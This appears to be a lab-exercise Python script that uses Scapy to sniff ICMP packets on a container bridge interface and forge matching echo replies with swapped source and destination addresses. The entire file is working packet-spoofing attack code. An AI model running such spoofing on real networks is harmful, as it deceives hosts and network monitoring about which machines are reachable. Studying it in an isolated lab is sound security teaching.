#!/usr/bin/env python3
from scapy.all import *

def spoof_pkt(pkt):
	if ICMP in pkt:
		print("Original Packet...")
		print("Source IP: ", pkt[IP].src)
		print("Destination IP: ", pkt[IP].dst)
		
		ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl, ttl=50)
		icmp = ICMP(type=0, id= pkt[ICMP].id, seq= pkt[ICMP].seq)
		data = pkt[Raw].load
		
		newpkt = ip/icmp/data
		
		print("Spoofed Packet....")
		print("Source IP: ", newpkt[IP].src)
		print("Destination IP: ", newpkt[IP].dst)
		
		send(newpkt, verbose=0)

pkt = sniff(iface=['br-c83e1ac99060'], filter='icmp', prn=spoof_pkt)
